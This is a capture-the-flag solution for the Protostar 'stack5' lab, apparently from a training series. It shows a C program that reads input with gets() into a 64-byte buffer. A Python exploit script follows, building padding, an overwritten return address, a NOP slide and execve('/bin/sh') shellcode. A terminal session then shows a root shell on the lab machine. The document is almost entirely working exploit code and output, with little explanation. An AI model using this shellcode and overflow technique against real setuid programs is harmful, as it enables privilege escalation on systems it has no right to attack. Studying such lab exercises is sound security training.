# Stack 5

## Source Code
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
## Solution
```Python
import struct

# padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZZ

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"

ret_addr = struct.pack("I", 0xbffff80c)

nop_slide = '\x90' * 128

# payload = '\xcc' * 4


# http://shell-storm.org/shellcode/files/shellcode-811.php
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


print padding + ret_addr + nop_slide + payload
```
```
user@protostar:/opt/protostar/bin$ vim /tmp/exploit.py; python /tmp/exploit.py > /tmp/exp
user@protostar:/opt/protostar/bin$ (cat /tmp/exp; cat) | ./stack5
whoami
root
ls -la
total 910
drwxr-xr-x 2 root root   368 Nov 24  2011 .
drwxr-xr-x 5 root root    60 Nov 22  2011 ..
-rwsr-xr-x 1 root root 54889 Nov 24  2011 final0
-rwsr-xr-x 1 root root 56773 Nov 24  2011 final1
-rwsr-xr-x 1 root root 79974 Nov 24  2011 final2
-rwsr-xr-x 1 root root 23017 Nov 24  2011 format0
-rwsr-xr-x 1 root root 22931 Nov 24  2011 format1
-rwsr-xr-x 1 root root 23233 Nov 24  2011 format2
-rwsr-xr-x 1 root root 23409 Nov 24  2011 format3
-rwsr-xr-x 1 root root 23472 Nov 24  2011 format4
-rwsr-xr-x 1 root root 23541 Nov 24  2011 heap0
-rwsr-xr-x 1 root root 23528 Nov 24  2011 heap1
-rwsr-xr-x 1 root root 54838 Nov 24  2011 heap2
-rwsr-xr-x 1 root root 54559 Nov 24  2011 heap3
-rwsr-xr-x 1 root root 54969 Nov 24  2011 net0
-rwsr-xr-x 1 root root 55350 Nov 24  2011 net1
-rwsr-xr-x 1 root root 55036 Nov 24  2011 net2
-rwsr-xr-x 1 root root 57092 Nov 24  2011 net3
-rwsr-xr-x 1 root root 54434 Nov 24  2011 net4
-rwsr-xr-x 1 root root 22412 Nov 24  2011 stack0
-rwsr-xr-x 1 root root 23196 Nov 24  2011 stack1
-rwsr-xr-x 1 root root 23350 Nov 24  2011 stack2
-rwsr-xr-x 1 root root 23130 Nov 24  2011 stack3
-rwsr-xr-x 1 root root 22860 Nov 24  2011 stack4
-rwsr-xr-x 1 root root 22612 Nov 24  2011 stack5
-rwsr-xr-x 1 root root 23331 Nov 24  2011 stack6
-rwsr-xr-x 1 root root 23461 Nov 24  2011 stack7
```
